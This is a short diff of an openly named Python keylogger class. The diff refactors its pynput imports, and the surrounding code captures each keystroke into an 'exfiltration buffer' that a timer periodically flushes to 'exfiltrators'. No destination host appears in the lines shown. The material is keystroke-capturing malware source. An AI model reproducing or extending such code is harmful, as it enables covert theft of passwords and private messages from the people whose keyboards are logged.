@@ -6,7 +6,7 @@ __author__ = "EONRaider @ keybase.io/eonraider"
 import contextlib
 from threading import Timer
 
-from pynput import keyboard
+from pynput.keyboard import Key, Listener
 
 
 class KeyLogger(object):
@@ -59,7 +59,7 @@ class KeyLogger(object):
               function=self._notify_all_exfiltrators).start()
         self.exfil_buffer.clear()
 
-    def _on_press(self, key: keyboard.Key) -> None:
+    def _on_press(self, key: Key) -> None:
         """Add the string representation of each keystroke captured
         'on press' by the listener thread to the exfiltration buffer."""
         try:  # A key was pressed and caught by the listener
@@ -74,12 +74,12 @@ class KeyLogger(object):
                     pressed_key = "[???]"
         self.exfil_buffer.append(pressed_key)
 
-    def _on_release(self, key: keyboard.Key) -> None:
+    def _on_release(self, key: Key) -> None:
         ...
 
     def execute(self) -> None:
-        with keyboard.Listener(on_press=self._on_press,
-                               on_release=self._on_release) as listener:
+        with Listener(on_press=self._on_press,
+                      on_release=self._on_release) as listener:
             with contextlib.suppress(KeyboardInterrupt):
                 self._notify_all_exfiltrators()
                 listener.join()
